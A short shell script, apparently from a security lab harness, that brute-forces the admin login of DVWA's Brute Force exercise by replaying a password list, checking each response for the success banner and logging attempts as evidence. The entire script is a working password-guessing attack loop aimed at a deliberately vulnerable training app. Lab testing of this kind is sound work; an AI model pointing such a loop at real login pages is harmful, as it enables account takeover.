#!/bin/sh
# Replay a short, lab-only password list against DVWA's Brute Force exercise.
set -eu
. /opt/scenarios/lib.sh

new_run bruteforce
login_as_admin_low
cookie_file="$RUN_DIR/cookies.txt"
attempt=0
success=0

while IFS= read -r password || [ -n "$password" ]; do
    [ -z "$password" ] && continue
    case "$password" in
        \#*) continue ;;
    esac
    attempt=$((attempt + 1))
    result="$RUN_DIR/attempt-${attempt}.html"
    dvwa_curl --fail --silent --show-error --cookie "$cookie_file" -G \
        --data-urlencode 'username=admin' --data-urlencode "password=$password" \
        --data-urlencode 'Login=Login' "$DVWA_URL/vulnerabilities/brute/" \
        -o "$result"

    if grep -q 'Welcome to the password protected area admin' "$result"; then
        printf '%s\n' "attempt=$attempt password=$password result=success" \
            | tee -a "$RUN_DIR/summary.txt"
        success=1
        break
    fi
    printf '%s\n' "attempt=$attempt password=$password result=failed" \
        | tee -a "$RUN_DIR/summary.txt"
done < /opt/scenarios/passwords-lab.txt

if [ "$success" -ne 1 ]; then
    echo "No successful lab login; this is expected after firewall isolation." >&2
    exit 1
fi

printf '%s\n' "Brute-force replay succeeded. Evidence: $RUN_DIR"
